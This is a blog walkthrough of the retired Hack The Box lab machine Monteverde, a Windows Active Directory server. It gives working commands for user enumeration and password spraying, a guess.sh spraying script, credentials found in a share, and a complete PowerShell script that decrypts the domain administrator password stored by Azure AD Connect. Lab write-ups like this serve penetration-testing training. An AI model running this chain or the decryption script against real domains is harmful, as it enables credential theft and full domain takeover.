---
layout: post
title: "Monteverde: Hack The Box Walkthrough"
date: 2020-06-13 19:28:47 +0000
last_modified_at: 2020-06-13 19:28:47 +0000
category: Walkthrough
tags: ["Hack The Box", Monteverde, retired, Windows]
comments: true
image:
  feature: monteverde-htb-walkthrough.png
---

This post documents the complete walkthrough of Monteverde, a retired vulnerable [VM][1] created by [egre55][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Monteverde is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun1 -p1-65535,U:1-65535 10.10.10.172 --rate=1000

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-14 02:01:57 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 389/tcp on 10.10.10.172                                   
Discovered open port 49671/tcp on 10.10.10.172                                 
Discovered open port 53/udp on 10.10.10.172                                    
Discovered open port 88/tcp on 10.10.10.172                                    
Discovered open port 135/tcp on 10.10.10.172                                   
Discovered open port 9389/tcp on 10.10.10.172                                  
Discovered open port 49702/tcp on 10.10.10.172                                 
Discovered open port 5985/tcp on 10.10.10.172                                  
Discovered open port 49670/tcp on 10.10.10.172                                 
Discovered open port 49669/tcp on 10.10.10.172                                 
Discovered open port 636/tcp on 10.10.10.172                                   
Discovered open port 464/tcp on 10.10.10.172                                   
Discovered open port 53/tcp on 10.10.10.172                                    
Discovered open port 3269/tcp on 10.10.10.172                                  
Discovered open port 445/tcp on 10.10.10.172                                   
Discovered open port 49667/tcp on 10.10.10.172                                 
Discovered open port 3268/tcp on 10.10.10.172                                  
Discovered open port 139/tcp on 10.10.10.172                                   
Discovered open port 593/tcp on 10.10.10.172
```

Looks like the open-port profile of a Windows Active Directory server. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -n -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -A --reason 10.10.10.172 -oN nmap.txt

PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain?       syn-ack ttl 127
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2020-01-14 02:23:11Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        syn-ack ttl 127 .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=1/14%Time=5E1D23DE%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");

Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 9m24s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-01-14T02:25:57
|_  start_date: N/A
```

Sure looks like we have an Active Directory server here. The domain appears to be **"MEGABANK.LOCAL"**. Let's see what we can enumerate with the good ol' `rpcclient`.

```
# rpcclient -U% 10.10.10.172
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

Plenty of accounts. Let's see what other information we can find.

```
rpcclient $> getdompwinfo
min_password_length: 7
password_properties: 0x00000000
```

Interesting. The minimum password length is 7. I'm assuming that it's a simple password looking at `password_properties`.

What else?

```
rpcclient $> querydominfo
Domain:         MEGABANK
Server:
Comment:
Total Users:    51
Total Groups:   0
Total Aliases:  23
Sequence No:    1
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1
```

So, the domain is really `MEGABANK`. Armed with the list of users, let's see if we are lucky enough to obtain their TGT hashes. Maybe some of them have their "Do not require Kerberos preauthentication" set?

```
# for user in $(cat users); do python3 GetNPUsers.py -format john -no-pass "megabank/$user" -dc-ip 10.10.10.172; done
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for AAD_987d7f2f57d2
[-] User AAD_987d7f2f57d2 doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for mhope
[-] User mhope doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for SABatchJobs
[-] User SABatchJobs doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for svc-ata
[-] User svc-ata doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for svc-bexec
[-] User svc-bexec doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for svc-netapp
[-] User svc-netapp doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for dgalanos
[-] User dgalanos doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for roleary
[-] User roleary doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for smorgan
[-] User smorgan doesn't have UF_DONT_REQUIRE_PREAUTH set
```

No luck there. Fret not, recall the very relaxed password policy? Maybe, we can write a simple shell script to test for simple passwords that are at least seven characters in length?

<div class="filename"><span>guess.sh</span></div>

```bash
#!/bin/bash

HOST=10.10.10.172
DOMAIN=megabank
USER=$1
PASS=$2

function die() {
  killall perl 2>/dev/null  
}

# Try username as password first. Who knows right?
if rpcclient -U"${DOMAIN}/${USER}%${USER}" $HOST -c "exit" &>/dev/null; then
  echo "[*] User: $USER"
  echo "[*] Pass: $USER"
  die
  exit 0
elif rpclient -U"${DOMAIN}/${USER}%${PASS}" $HOST -c "exit" &>/dev/null; then
  echo "[*] User: $USER"
  echo "[*] Pass: $PASS"
  die
  exit 0
fi
```

The script is driven by `rpcclient`. We try the username as password first, otherwise, give the password list a shot. Let's run it.

```
# for user in $(cat users); do parallel -j40 ./guess.sh $user {} < passwords.txt 2>/dev/null | tee $user; done
[*] User: SABatchJobs
[*] Pass: SABatchJobs
^C
```

Holy crap! This is surely a pleasant surprise.

### Authenticated SMB Enumeration

Armed with the credentials (`SABatchJobs:SABatchJobs`), let's see if we can enumerate file shares with `smbclient`.

```
# smbclient -I 10.10.10.172 -L MONTEVERDE -U"megabank/SABatchJobs%SABatchJobs"

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        azure_uploads   Disk      
        C$              Disk      Default share
        E$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
        users$          Disk
```

Long story short, there's a file `azure.xml` that contains sensitive information at `//10.10.10.172/users$/mhope`.

{% include image.html image_alt="5ff03c43.png" image_src="/69130b0b-7835-492e-81fb-078806c1be05/5ff03c43.png" %}

Let's grab that file.

{% include image.html image_alt="f9e66c5c.png" image_src="/69130b0b-7835-492e-81fb-078806c1be05/f9e66c5c.png" %}

<div class="filename"><span>azure.xml</span></div>

```xml
# cat azure.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

Another password??!!

### PSRemoting / WinRM

Enter [Evil-WinRM](https://github.com/Hackplayers/evil-winrm). Armed with the credential (`mhope:4n0therD4y@n0th3r$`), let's see if we can get ourselves a shell.

{% include image.html image_alt="f200ad1d.png" image_src="/69130b0b-7835-492e-81fb-078806c1be05/f200ad1d.png" %}

Awesome.

The file `user.txt` is at `mhope`'s desktop.

{% include image.html image_alt="207a1adb.png" image_src="/69130b0b-7835-492e-81fb-078806c1be05/207a1adb.png" %}

## Privilege Escalation

During enumeration of `mhope`'s account, I noticed that Microsoft Azure Active Directory Connect and Microsoft SQL Server were installed.

{% include image.html image_alt="a2075b1d.png" image_src="/69130b0b-7835-492e-81fb-078806c1be05/a2075b1d.png" %}

Google lands me to this excellent [article](https://blog.xpnsec.com/azuread-connect-for-redteam/). Taking a leaf from the article led me to searching for the appropriate Active Directory Synchronization parameters.

{% include image.html image_alt="a0a75a8b.png" image_src="/69130b0b-7835-492e-81fb-078806c1be05/a0a75a8b.png" %}

We can see the SQL server name and database name from above. Armed with this insight, we can attempt a SQL connection to the above database with the following PowerShell commands.

<div class="filename"><span>leak.ps1</span></div>

```powershell
$connection = "server=monteverde;database=ADSync;integrated security=true"
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList $connection
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

Write-Host $config
```

Running the script gave me this.

{% include image.html image_alt="ba901a64.png" image_src="/69130b0b-7835-492e-81fb-078806c1be05/ba901a64.png" %}

You can see that the `administrator` credentials were used for Azure Active Directory Connect. Here's the entire script to decrypt the `administrator`'s password.

```powershell
$connection = "server=monteverde;database=ADSync;integrated security=true"
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList $connection
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

# Write-Host $config

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

Write-Host $decrypted
```

{% include image.html image_alt="c24ea0aa.png" image_src="/69130b0b-7835-492e-81fb-078806c1be05/c24ea0aa.png" %}

There you have it! With the `administrator`'s password, it's trivial to get another shell with `administrator` privileges through Evil-WinRM.

{% include image.html image_alt="dae9ba3c.png" image_src="/69130b0b-7835-492e-81fb-078806c1be05/dae9ba3c.png" %}

The file `root.txt` is at `administrator`'s desktop.

{% include image.html image_alt="25fa0c27.png" image_src="/69130b0b-7835-492e-81fb-078806c1be05/25fa0c27.png" %}

[1]: https://www.hackthebox.eu/home/machines/profile/223
[2]: https://www.hackthebox.eu/home/users/profile/1190
[3]: https://www.hackthebox.eu/
